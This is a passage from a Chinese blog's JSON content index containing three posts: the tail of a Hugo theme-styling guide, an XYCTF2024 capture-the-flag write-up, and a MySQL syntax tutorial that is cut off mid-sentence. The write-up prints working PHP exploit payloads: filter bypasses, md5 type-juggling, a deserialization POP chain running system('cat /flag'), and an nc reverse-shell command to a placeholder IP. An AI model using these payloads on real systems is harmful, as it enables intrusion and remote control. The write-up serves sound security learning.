colours[Math.floor(Math.random() * colours.length)]; } update() { this.x += this.vx - normal.x; this.y += this.vy - normal.y; normal.x = -2 / window.innerWidth * Math.sin(this.angle); normal.y = -2 / window.innerHeight * Math.cos(this.angle); this.r -= 0.1; // 修改后的减小速率 this.vx *= 0.9; this.vy *= 0.9; } } function pushBalls(count = 1, x = origin.x, y = origin.y) { for (let i = 0; i \u0026lt; count; i++) { balls.push(new Ball(x, y)); } } function randBetween(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; } function loop() { ctx.fillStyle = \u0026#34;rgba(255, 255, 255, 0)\u0026#34;; ctx.clearRect(0, 0, canvas.width, canvas.height); for (let i = 0; i \u0026lt; balls.length; i++) { let b = balls[i]; if (b.r \u0026lt; 0) continue; ctx.fillStyle = b.color; ctx.beginPath(); ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2, false); ctx.fill(); b.update(); } if (longPressed == true) { multiplier += 0.2; } else if (!longPressed \u0026amp;\u0026amp; multiplier \u0026gt;= 0) { multiplier -= 0.4; } removeBall(); requestAnimationFrame(loop); } function removeBall() { for (let i = 0; i \u0026lt; balls.length; i++) { let b = balls[i]; if (b.x + b.r \u0026lt; 0 || b.x - b.r \u0026gt; width || b.y + b.r \u0026lt; 0 || b.y - b.r \u0026gt; height || b.r \u0026lt; 0) { balls.splice(i, 1); } } } } clickEffect(); // 调用特效函数 页脚分割线 页脚内容与其他内容连在一起有点杂乱，因此添加一个页脚的分割线还是很有必要的。\n找到your_site\\assets\\css\\_custom.scss文件，在里面添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* 页脚分割线 */ .footer { display: block; border-top-width: 3px; border-top-style: solid; border-top-color: #96c1db; position: relative; z-index: -1; max-width: 800px; width: 60%; margin: .5rem auto 0 auto; padding-left: 0rem; padding-right: 0rem; } @media only screen and (max-width: 1440px) { .footer { width:54.5% } } @media only screen and (max-width: 1200px) { .footer { width:50.5% } } @media only screen and (max-width: 960px) { .footer { width: 77% } } @media only screen and (max-width: 680px) { .footer { width: 95% } } 二级标题的修改 原主题的二级标题我不好评价，它跟下一级的标题几乎区分不开，这导致文章看起来没有条理。因此在这里我们将修改二级标题的样式以做区分。\n找到your_site\\assets\\css\\_custom.scss文件，在里面添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /* 标题 */ .page.single h2 { box-shadow: rgb(95, 90, 75) 0px 0px 0px 1px, rgba(10, 10, 0, 0.5) 1px 1px 6px 1px; color: rgb(255, 255, 255); font-family: 微软雅黑, 宋体, 黑体, Arial; font-weight: bold; line-height: 1.3; text-shadow: rgb(34, 34, 34) 2px 2px 3px; background: rgb(43, 102, 149); border-radius: 6px; border-width: initial; border-style: none; border-color: initial; border-image: initial; padding: 7px; margin: 18px 0px 18px -5px !important; } 1 https://www.bilibili.com/video/BV1Sx411T7QQ 1 2 3 或者 Bilibili 视频av号或BV号错误！请检查视频av号或BV号是否正确\n当前视频av或BV号：，视频分P：1\n","date":"2024-05-16T19:34:59+08:00","permalink":"https://hack.liagu-one.top/p/90307b6/","title":"Hugo Fixit美化"},{"content":"XYCTF2024复现 - XYNU::CTF (imxbt.cn)\nXYCTF2024复现 WEB ezclass 1 2 3 4 5 6 7 8 \u0026lt;?php highlight_file(__FILE__); $a=$_GET[\u0026#39;a\u0026#39;]; $aa=$_GET[\u0026#39;aa\u0026#39;]; $b=$_GET[\u0026#39;b\u0026#39;]; $bb=$_GET[\u0026#39;bb\u0026#39;]; $c=$_GET[\u0026#39;c\u0026#39;]; ((new $a($aa))-\u0026gt;$c())((new $b($bb))-\u0026gt;$c()); 涉及PHP的动态对象创建和方法调用,构造对象和调用方法\n利用了PHP的动态对象和方法调用：\nPHP里面有内置类，其中Error类的::getMessage方法可以返回Error类实例化时接受的字符串(-\u0026gt;动态执行)\n1 ?a=Error\u0026amp;aa=system\u0026amp;c=getMessage\u0026amp;b=Error\u0026amp;bb=ls 1 2 3 4 \u0026lt;?php new $a = Error(\u0026#34;Something error!\u0026#34;) echo $a-\u0026gt;getMessage(); ezhttp 难度：签到\n进去是一个登录框，注意到有robots.txt，里面有Disallow: /l0gin.txt，进l0gin.txt得到用户名密码\nusername: XYCTF password: @JOILha!wuigqi123$\n其他的知识点我放这了，佬们可以直接复制到http头里（记得去掉注释）\n1 2 3 4 5 Referer: yuanshen.com // 从yuanshen.com来的 User-Agent: XYCTF // 用XYCTF浏览器 Client-IP: 127.0.0.1 // 本地用户，不用xff（X-Forward-For） Via: ymzx.qq.com // 从ymzx.qq.com代理 Cookie: XYCTF // XYCTF的小饼干（Cookie） 总结：我也想吃XYCTF的小flag\nwarm up 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php include \u0026#39;next.php\u0026#39;; highlight_file(__FILE__); $XYCTF = \u0026#34;Warm up\u0026#34;; extract($_GET); if (isset($_GET[\u0026#39;val1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;val2\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;val1\u0026#39;] != $_GET[\u0026#39;val2\u0026#39;] \u0026amp;\u0026amp; md5($_GET[\u0026#39;val1\u0026#39;]) == md5($_GET[\u0026#39;val2\u0026#39;])) { echo \u0026#34;ez\u0026#34; . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { die(\u0026#34;什么情况,这么基础的md5做不来\u0026#34;); } if (isset($md5) \u0026amp;\u0026amp; $md5 == md5($md5)) { echo \u0026#34;ezez\u0026#34; . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { die(\u0026#34;什么情况,这么基础的md5做不来\u0026#34;); } if ($XY == $XYCTF) { if ($XY != \u0026#34;XYCTF_550102591\u0026#34; \u0026amp;\u0026amp; md5($XY) == md5(\u0026#34;XYCTF_550102591\u0026#34;)) { echo $level2; } else { die(\u0026#34;什么情况,这么基础的md5做不来\u0026#34;); } } else { die(\u0026#34;学这么久,传参不会传?\u0026#34;); } 什么情况,这么基础的md5做不来 php代码审计\nEZMD5 MD5碰撞,附上两张图片\n碰撞图片\n题目的逻辑很简单，上传两张图片，两张图片不相同，但是计算出来的md5值相同 那么有两种方法，\n一种是直接在网上找，\n另一种是自己手动爆破两张图片出来 网上找的图片可以参考这个链接https://crypto.stackexchange.com/questions/1434/arethere-two-known-strings-which-have-the-same-md5-hash-value\n另一种是用fastcoll碰撞出两张图片\nwarm up 第一层也是相当基础的弱类型比较，直接数组绕过就行(当然还有其他方法)\n然后是第二层，很简单双md5，网上随便找个值就能过了，发现没有传参的方式，不知道怎么传 了，怎么办呢\n我们看到开头有一个 extract($_GET); ，那么很明细是变量覆盖了，我们直接传变量名就能修改 变量的值，那么第二次也出来了找个0e开头，md5也是0e开头的字符串\n1 md5=0e215962017 第三层XYCTF_550102591的md5为0e937920457786991080577371025051\n结果还是0e啊…直接覆盖XY和XYCTF然后0e比较\n1 \u0026amp;XY=s878926199a\u0026amp;XYCTF=s878926199a preg_replace能执行,preg_match() 只能处理字符串，遇到数组时会返回 false ，仅仅是要绕过条件的话只需要上传 一个数组即可，我们可以看到后续并没有用到 $_POST 的a，所以传一个数组的数字即可\n然后是后面，我们可以从返回的包注意到，php的版本很低，这里就有一个可以利用的地方， preg_replace 可以使用 /e 来直接执行命令，/e 标记在 PHP 5.5 中被废除，并在 PHP 7.0 中 被移除 所以这里我们完全可以利用这个漏洞，下面直接给出payload\ngive me flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php include(\u0026#39;flag.php\u0026#39;); $FLAG_md5 = md5($FLAG); if(!isset($_GET[\u0026#39;md5\u0026#39;]) || !isset($_GET[\u0026#39;value\u0026#39;])) { highlight_file(__FILE__); die($FLAG_md5); } $value = $_GET[\u0026#39;value\u0026#39;]; $md5 = $_GET[\u0026#39;md5\u0026#39;]; $time = time(); if(md5($FLAG.$value.$time)===$md5) { echo \u0026#34;yes, give you flag: \u0026#34;; echo $FLAG; } HASH长度拓展攻击(不懂)文章\n浅谈HASH长度拓展攻击 - Yunen的博客 - 博客园 (cnblogs.com)\n知识库广告位招租 | 狼组安全团队公开知识库 (wgpsec.org)\n牢牢记住，逝者为大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); function Kobe($cmd) { if (strlen($cmd) \u0026gt; 13) { die(\u0026#34;see you again~\u0026#34;); } if (preg_match(\u0026#34;/echo|exec|eval|system|fputs|\\.|\\/|\\\\|/i\u0026#34;, $cmd)) { die(\u0026#34;肘死你\u0026#34;); } foreach ($_GET as $val_name =\u0026gt; $val_val) { if (preg_match(\u0026#34;/bin|mv|cp|ls|\\||f|a|l|\\?|\\*|\\\u0026gt;/i\u0026#34;, $val_val)) { return \u0026#34;what can i say\u0026#34;; } } return $cmd; } $cmd = Kobe($_GET[\u0026#39;cmd\u0026#39;]); echo \u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,manba out\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; eval(\u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,mamba out\u0026#34;); #man,,manba out 看题目有几处限制\nstrlen($cmd) \u0026gt; 13\n考虑 反引号执行系统命令(只有两个字符) 等价于 `shell_exec(); 这个命令是没有回显的 做个转接头 逃逸 命令长度限制\n1 `$_GET[1]`; 将执行 GET参数中1的值 过滤后最终执行eval(\u0026quot;#man,\u0026quot; . $cmd . \u0026ldquo;,mamba out\u0026rdquo;);有无关字符\n在php中是单行注释符 用 %0A换行即可绕过（到下一行了）\n. \u0026ldquo;,mamba out\u0026rdquo; 后面有无关字符 用#注释后面即可 payload: 刚好13个字符\n1 cmd=%0a`$_GET[1]`;%23 1 cmd=%0a`$_GET[1]`;%23\u0026amp;1=c\u0026#39;\u0026#39;p /* 用 \u0026rsquo;\u0026rsquo; 来绕过过滤的cp ，但是我们可以看到通配符是给过滤了的，我们就可以引出第二个技巧，[a-z] ，linux里用中括号可以根据ascii码来匹配里面的字符集， [a-z] 就是匹配任何小写字母a到z中的一个字符，那么我们就能简单的构造出想要的字符了\n1 cmd=%0a`$_GET[1]`;%23\u0026amp;1=c\u0026#39;\u0026#39;p /[@-z][@-z][@-z]g . 或者弹shell\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=nc xx.xx.xx.xx 8888 -e /bi\u0026#39;\u0026#39;n/sh 我是一个复读机 ssti注入,没攻破\nEZmake\nEZpop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class AAA { public $s; public $a; public function __toString() { echo \u0026#34;you get 2 A \u0026lt;br\u0026gt;\u0026#34;; $p = $this-\u0026gt;a; return $this-\u0026gt;s-\u0026gt;$p; } } class BBB { public $c; public $d; public function __get($name) { echo \u0026#34;you get 2 B \u0026lt;br\u0026gt;\u0026#34;; $a=$_POST[\u0026#39;a\u0026#39;]; $b=$_POST; $c=$this-\u0026gt;c; $d=$this-\u0026gt;d; if (isset($b[\u0026#39;a\u0026#39;])) { unset($b[\u0026#39;a\u0026#39;]); } call_user_func($a,$b)($c)($d); } } class CCC { public $c; public function __destruct() { echo \u0026#34;you get 2 C \u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;c; } } if(isset($_GET[\u0026#39;xy\u0026#39;])) { $a = unserialize($_GET[\u0026#39;xy\u0026#39;]); throw new Exception(\u0026#34;noooooob!!!\u0026#34;); } 在反序列化后访问未定义属性来触发 __get。 在对象销毁时触发 __destruct。 在对象转换为字符串时触发 __toString。 法一 这里链子很简单入口是 CCC 的 destruct 然后 的get ，但是我们发现开始的 echo 触发 AAA 的 toString 然后p 触发 BBB destruct 怎么也触发不了，那是因为我们需要绕过 throw new Exception(\u0026ldquo;noooooob!!!\u0026rdquo;);\n众所周知，strrev函数可以把字符串倒过来再输出\n还是众所周知，implode函数可以将数组里的内容转为字符串\n链子很简单：CCC::__destruct()-\u0026gt;AAA::__toString()-\u0026gt;BBB::__get() 主要是对call_user_func($a, $b)($c)($d);的理解 还有这个姿势需要注意，PHP GC垃圾回收机制 https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD\u0026alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0 还有就是if (isset($b['a'])) { unset($b['a']); } 传入的b数组的a值会被删掉 关于数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php class AAA { public $s; public $a; } class BBB { public $c = array(\u0026#39;system\u0026#39;); public $d = \u0026#39;cat /flag\u0026#39;; } class CCC { public $c; } $a = new CCC(); $a-\u0026gt;c = new AAA(); $a-\u0026gt;c-\u0026gt;s = new BBB(); echo serialize(array($a, 0)); # a:2:{i:0;O:3:\u0026#34;CCC\u0026#34;:1:{s:1:\u0026#34;c\u0026#34;;O:3:\u0026#34;AAA\u0026#34;:2:{s:1:\u0026#34;s\u0026#34;;O:3:\u0026#34;BBB\u0026#34;:2:{s:1:\u0026#34;c\u0026#34;;a:1:{i:0;s:6:\u0026#34;system\u0026#34;;}s:1:\u0026#34;d\u0026#34;;s:9:\u0026#34;cat /flag\u0026#34;;}s:1:\u0026#34;a\u0026#34;;N;}}i:1;i:0;} 最终payload\n1 2 3 4 5 6 7 8 9 PHP /?xy=a:2:{i:0;O:3:\u0026#34;CCC\u0026#34;:1:{s:1:\u0026#34;c\u0026#34;;O:3:\u0026#34;AAA\u0026#34;:2:{s:1:\u0026#34;s\u0026#34;;O:3:\u0026#34;BBB\u0026#34;:2:{s:1:\u0026#34;c\u0026#34;;a:1:{i:0;s:6:\u0026#34;system\u0026#34;;}s:1:\u0026#34;d\u0026#34;;s:9:\u0026#34;cat /flag\u0026#34;;}s:1:\u0026#34;a\u0026#34;;N;}}i:0;i:0;} post: a=array_pop\u0026amp;b=array_pop array_pop(array)是删除数组元素并返回(这个想法基于题目的删除机制想出来的) array_pop(array(\u0026#34;array_pop\u0026#34;))(array(\u0026#34;system\u0026#34;))(\u0026#34;cat /flag\u0026#34;) array_pop(array(\u0026#34;system\u0026#34;))(\u0026#34;cat /flag\u0026#34;) system(\u0026#34;cat /flag\u0026#34;) 或者：a=current\u0026amp;b=current current(array)是返回当前数组元素(那我不删除，直接返回也行) 法二\n看看题，有哪里不太一样：\n1 2 3 4 if (isset($_GET[\u0026#39;xy\u0026#39;])) { $a = unserialize($_GET[\u0026#39;xy\u0026#39;]); throw new Exception(\u0026#34;noooooob!!!\u0026#34;); } 这里在 unserialize 之后直接 throw 了一个异常，反序列化出来的对象不会正常等到 __destruct 方法的执行，那就需要在反序列化的时候就做到：将对象创建，然后紧接着让它被销毁。\n这里可以使用数组来实现。尝试构造一个 [0 =\u0026gt; $obj, 0 =\u0026gt; null] 的数组，在反序列化的时候，会先创建目标对象，然后因为又遇到了同样下标为 0 的元素，所以会将目标对象销毁。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $post_a = \u0026#39;implode\u0026#39;; $post_b = [\u0026#39;system\u0026#39;]; $payload = \u0026#34;cat /flag\u0026#34;; $bbb = new BBB(); $bbb-\u0026gt;c = $payload; $aaa = new AAA(); $aaa-\u0026gt;s = $bbb; $aaa-\u0026gt;a = \u0026#34;233\u0026#34;; $ccc = new CCC(); $ccc-\u0026gt;c = $aaa; $ser = serialize([$ccc, null]); # 整个 [0 =\u0026gt; $obj, 1 =\u0026gt; null] $ser = str_replace(\u0026#39;i:1;N;}\u0026#39;, \u0026#39;i:0;N;}\u0026#39;, $ser); # 改成 [0 =\u0026gt; $obj, 0 =\u0026gt; null] print(urlencode($ser)); ez?Make 真的\u0026hellip;简单吗?\u0026hellip;@xa$\u0026lt;x{w_x\n1 payload:cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;echo 63617420666c6167| xxd -r -p|sh xxd:\n-a 自动跳过空白内容 -c 设置每行显示多少字节内容 -b 转换成二进制模式 -g 设置以几个字节为一块 -h 显示帮助信息 -i 显示为C语言的包含文件形式 -l 显示多少字节的内容 -p 使用连续的纯十六进制转储输出 -r 将十六进制逆向操作成二进制形式 -s 设置从某个地址开始内容 -u 使用大写字母形式 -v 显示帮助信息 ","date":"2024-05-15T21:52:02+08:00","permalink":"https://hack.liagu-one.top/p/51ecbd6/","title":"XYCTF复盘"},{"content":"基础篇 通用语法及分类 DDL: 数据定义语言，用来定义数据库对象（数据库、表、字段） DML: 数据操作语言，用来对数据库表中的数据进行增删改 DQL: 数据查询语言，用来查询数据库中表的记录 DCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限 DDL（数据定义语言） 数据定义语言\n数据库操作 查询所有数据库： SHOW DATABASES; 查询当前数据库： SELECT DATABASE(); 创建数据库： CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ]; 删除数据库： DROP DATABASE [ IF EXISTS ] 数据库名; 使用数据库： USE 数据库名;\n注意事项 UTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集 表操作 查询当前数据库所有表： SHOW TABLES; 查询表结构： DESC 表名; 查询指定表的建表语句： SHOW CREATE TABLE 表名;\n创建表：\n1 2 3 4 5 6 7 CREATE TABLE 表名( 字段1 字段1类型 [COMMENT 字段1注释], 字段2 字段2类型 [COMMENT 字段2注释], 字段3 字段3类型 [COMMENT 字段3注释], ... 字段n 字段n类型 [COMMENT 字段n注释] )[ COMMENT 表注释 ]; 最后一个字段后面没有逗号\n添加字段： ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束]; 例：ALTER TABLE emp ADD nickname varchar(20) COMMENT '昵称';\n修改数据类型： ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度); 修改字段名和字段类型： ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束]; 例：将emp表的nickname字段修改为username，类型为varchar(30) ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '昵称';\n删除字段： ALTER TABLE 表名 DROP 字段名;\n修改表名： ALTER TABLE 表名 RENAME TO 新表名\n删除表： DROP TABLE [IF EXISTS] 表名; 删除表，并重新创建该表： TRUNCATE TABLE 表名;\nDML（数据操作语言） 添加数据 指定字段： INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...); 全部字段： INSERT INTO 表名 VALUES (值1, 值2, ...);\n批量添加数据： INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...); INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);\n注意事项 字符串和日期类型数据应该包含在引号中 插入的数据大小应该在字段的规定范围内 更新和删除数据 修改数据： UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ]; 例： UPDATE emp SET name = 'Jack' WHERE id = 1;\n删除数据： DELETE FROM 表名 [ WHERE 条件 ];\nDQL（数据查询语言） 语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 SELECT 字段列表 FROM 表名字段 WHERE 条件列表 GROUP BY 分组字段列表 HAVING 分组后的条件列表 ORDER BY 排序字段列表 LIMIT 分页参数 基础查询 查询多个字段： SELECT 字段1, 字段2, 字段3, ... FROM 表名; SELECT * FROM 表名;\n设置别名： SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名; SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;\n去除重复记录： SELECT DISTINCT 字段列表 FROM 表名;\n转义： SELECT * FROM 表名 WHERE name LIKE '/_张三' ESCAPE '/' / 之后的_不作为通配符\n条件查询 语法： SELECT 字段列表 FROM 表名 WHERE 条件列表;\n条件：\n比较运算符 功能 \u0026gt; 大于 \u0026gt;= 大于等于 \u0026lt; 小于 \u0026lt;= 小于等于 = 等于 \u0026lt;\u0026gt; 或 != 不等于 BETWEEN \u0026hellip; AND \u0026hellip; 在某个范围内（含最小、最大值） IN(\u0026hellip;) 在in之后的列表中的值，多选一 LIKE 占位符 模糊匹配（_匹配单个字符，%匹配任意个字符） IS NULL 是NULL 逻辑运算符 功能 AND 或 \u0026amp;\u0026amp; 并且（多个条件同时成立） OR 或 || 或者（多个条件任意一个成立） NOT 或 ! 非，不是 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -- 年龄等于30 select * from employee where age = 30; -- 年龄小于30 select * from employee where age \u0026lt; 30; -- 小于等于 select * from employee where age \u0026lt;= 30; -- 没有身份证 select * from employee where idcard is null or idcard = \u0026#39;\u0026#39;; -- 有身份证 select * from employee where idcard; select * from employee where idcard is not null; -- 不等于 select * from employee where age != 30; -- 年龄在20到30之间 select * from employee where age between 20 and 30; select * from employee where age \u0026gt;= 20 and age \u0026lt;= 30; -- 下面语句不报错，但查不到任何信息 select * from employee where age between 30 and 20; -- 性别为女且年龄小于30 select * from employee where age \u0026lt; 30 and gender = \u0026#39;女\u0026#39;; -- 年龄等于25或30或35 select * from employee where age = 25 or age = 30 or age = 35; select * from employee where age in (25, 30, 35); -- 姓名为两个字 select * from employee where name like \u0026#39;__\u0026#39;; -- 身份证最后为X select * from employee where idcard like \u0026#39;%X\u0026#39;; 聚合查询（聚合函数） 常见聚合函数：\n函数 功能 count 统计数量 max 最大值 min 最小值 avg 平均值 sum 求和 语法： SELECT 聚合函数(字段列表) FROM 表名; 例： SELECT count(id) from employee where workaddress = \u0026quot;广东省\u0026quot;;\n分组查询 语法： SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后的过滤条件 ];\nwhere 和 having 的区别：\n执行时机不同：where是分组之前进行过滤，不满足where条件不参与分组；having是分组后对结果进行过滤。 判断条件不同：where不能对聚合函数进行判断，而having可以。 例子：\n1 2 3 4 5 6 7 8 9 10 -- 根据性别分组，统计男性和女性数量（只显示分组数量，不显示哪个是男哪个是女） select count(*) from employee group by gender; -- 根据性别分组，统计男性和女性数量 select gender, count(*) from employee group by gender; -- 根据性别分组，统计男性和女性的平均年龄 select gender, avg(age) from employee group by gender; -- 年龄小于45，并根据工作地址分组 select workaddress, count(*) from employee where age \u0026lt; 45 group by workaddress; -- 年龄小于45，并根据工作地址分组，获取员工数量大于等于3的工作地址 select workaddress, count(*) address_count from employee where age \u0026lt; 45 group by workaddress having address_count \u0026gt;= 3; 注意事项 执行顺序：where \u0026gt; 聚合函数 \u0026gt; having 分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义 排序查询 语法： SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1, 字段2 排序方式2;\n排序方式：\nASC: 升序（默认） DESC: 降序 例子：\n1 2 3 4 5 -- 根据年龄升序排序 SELECT * FROM employee ORDER BY age ASC; SELECT * FROM employee ORDER BY age; -- 两字段排序，根据年龄升序排序，入职时间降序排序 SELECT * FROM employee ORDER BY age ASC, entrydate DESC; 注意事项 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序\n分页查询 语法： SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数;\n例子：\n1 2 3 4 -- 查询第一页数据，展示10条 SELECT * FROM employee LIMIT 0, 10; -- 查询第二页 SELECT * FROM employee LIMIT 10, 10; 注意事项 起始索引从0开始，起始索引 = （查询页码 - 1） * 每页显示记录数 分页查询是数据库的方言，不同数据库有不同实现，MySQL是LIMIT 如果查询的是第一页数据，起始索引可以省略，直接简写 LIMIT 10 DQL执行顺序 FROM -\u0026gt; WHERE -\u0026gt; GROUP BY -\u0026gt; SELECT -\u0026gt; ORDER BY -\u0026gt; LIMIT\nDCL 管理用户 查询用户：\n1 2 USE mysql; SELECT * FROM user; 创建用户: CREATE USER '用户名'@'主机名' IDENTIFIED BY '密码';\n修改用户密码： ALTER USER '用户名'@'主机名' IDENTIFIED WITH mysql_native_password BY '新密码';\n删除用户： DROP USER '用户名'@'主机名';\n例子：\n1 2 3 4 5 6 7 8 9 -- 创建用户test，只能在当前主机localhost访问 create user \u0026#39;test\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;123456\u0026#39;; -- 创建用户test，能在任意主机访问 create user \u0026#39;test\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;123456\u0026#39;; create user \u0026#39;test\u0026#39; identified by \u0026#39;123456\u0026#39;; -- 修改密码 alter user \u0026#39;test\u0026#39;@\u0026#39;localhost\u0026#39; identified with mysql_native_password by \u0026#39;1234\u0026#39;; -- 删除用户 drop user \u0026#39;test\u0026#39;@\u0026#39;localhost\u0026#39;; 注意事项 主机名可以使用 % 通配 权限控制 常用权限：\n权限 说明 ALL, ALL PRIVILEGES 所有权限 SELECT 查询数据 INSERT 插入数据 UPDATE 修改数据 DELETE 删除数据 ALTER 修改表 DROP 删除数据库/表/视图 CREATE 创建数据库/表 更多权限请看权限一览表\n查询权限： SHOW GRANTS FOR '用户名'@'主机名';\n授予权限： GRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名';\n撤销权限： REVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';\n注意事项 多个权限用逗号分隔 授权时，数据库名和表名可以用 * 进行通配，代表所有 函数 字符串函数 数值函数 日期函数 流程函数 字符串函数 常用函数：\n函数 功能 CONCAT(s1, s2, \u0026hellip;, sn) 字符串拼接，将s1, s2, \u0026hellip;, sn拼接成一个字符串 LOWER(str) 将字符串全部转为小写 UPPER(str) 将字符串全部转为大写 LPAD(str, n, pad) 左填充，用字符串pad对str的左边进行填充，达到n个字符串长度 RPAD(str, n, pad) 右填充，用字符串pad对str的右边进行填充，达到n个字符串长度 TRIM(str) 去掉字符串头部和尾部的空格 SUBSTRING(str, start, len) 返回从字符串str从start位置起的len个长度的字符串 REPLACE(column, source, replace) 替换字符串 使用示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 -- 拼接 SELECT CONCAT(\u0026#39;Hello\u0026#39;, \u0026#39;World\u0026#39;); -- 小写 SELECT LOWER(\u0026#39;Hello\u0026#39;); -- 大写 SELECT UPPER(\u0026#39;Hello\u0026#39;); -- 左填充 SELECT LPAD(\u0026#39;01\u0026#39;, 5, \u0026#39;-\u0026#39;); -- 右填充 SELECT RPAD(\u0026#39;01\u0026#39;, 5, \u0026#39;-\u0026#39;); -- 去除空格 SELECT TRIM(\u0026#39; Hello World \u0026#39;); -- 切片（起始索引为1） SELECT SUBSTRING(\u0026#39;Hello World\u0026#39;, 1, 5); 数值函数 常见函数：\n函数 功能 CEIL(x) 向上取整 FLOOR(x) 向下取整 MOD(x, y) 返回x/y的模 RAND() 返回0~1内的随机数 ROUND(x, y) 求参数x的四舍五入值，保留y位小数 日期函数 常用函数：\n函数 功能 CURDATE() 返回当前日期 CURTIME() 返回当前时间 NOW() 返回当前日期和时间 YEAR(date) 获取指定date的年份 MONTH(date) 获取指定date的月份 DAY(date) 获取指定date的日期 DATE_ADD(date, INTERVAL expr type) 返回一个日期/时间值加上一个时间间隔expr后的时间值 DATEDIFF(date1, date2) 返回起始时间date1和结束时间date2之间的天数 例子：\n1 2 -- DATE_ADD SELECT DATE_ADD(NOW(), INTERVAL 70 YEAR); 流程函数 常用函数：\n函数 功能 IF(value, t, f) 如果value为true，则返回t，否则返回f IFNULL(value1, value2) 如果value1不为空，返回value1，否则返回value2 CASE WHEN [ val1 ] THEN [ res1 ] \u0026hellip; ELSE [ default ] END 如果val1为true，返回res1，\u0026hellip; 否则返回default默认值 CASE [ expr ] WHEN [ val1 ] THEN [ res1 ] \u0026hellip; ELSE [ default ] END 如果expr的值等于val1，返回res1，\u0026hellip; 否则返回default默认值 例子：\n1 2 3 4 5 6 7 8 select name, (case when age \u0026gt; 30 then \u0026#39;中年\u0026#39; else \u0026#39;青年\u0026#39; end) from employee; select name, (case workaddress when \u0026#39;北京市\u0026#39; then \u0026#39;一线城市\u0026#39; when \u0026#39;上海市\u0026#39; then \u0026#39;一线城市\u0026#39; else \u0026#39;二线城市\u0026#39; end) as \u0026#39;工作地址\u0026#39; from employee; 约束 分类：\n约束 描述 关键字 非空约束 限制该字段的数据不能为null NOT NULL 唯一约束 保证该字段的所有数据都是唯一、不重复的 UNIQUE 主键约束 主键是一行数据的唯一标识，要求非空且唯一 PRIMARY KEY 默认约束 保存数据时，如果未指定该字段的值，则采用默认值 DEFAULT 检查约束（8.0.1版本后） 保证字段值满足某一个条件 CHECK 外键约束 用来让两张图的数据之间建立连接，保证数据的一致性和完整性 FOREIGN KEY 约束是作用于表中字段上的，可以再创建表/修改表的时候添加约束。\n常用约束 约束条件 关键字 主键 PRIMARY KEY 自动增长 AUTO_INCREMENT 不为空 NOT NULL 唯一 UNIQUE 逻辑条件 CHECK 默认值 DEFAULT 例子：\n1 2 3 4 5 6 7 create table user( id int primary key auto_increment, name varchar(10) not null unique, age int check(age \u0026gt; 0 and age \u0026lt; 120), status char(1) default \u0026#39;1\u0026#39;, gender char(1) ); 外键约束 添加外键：\n1 2 3 4 5 6 7 8 9 CREATE TABLE 表名( 字段名 字段类型, ... [CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名) ); ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN 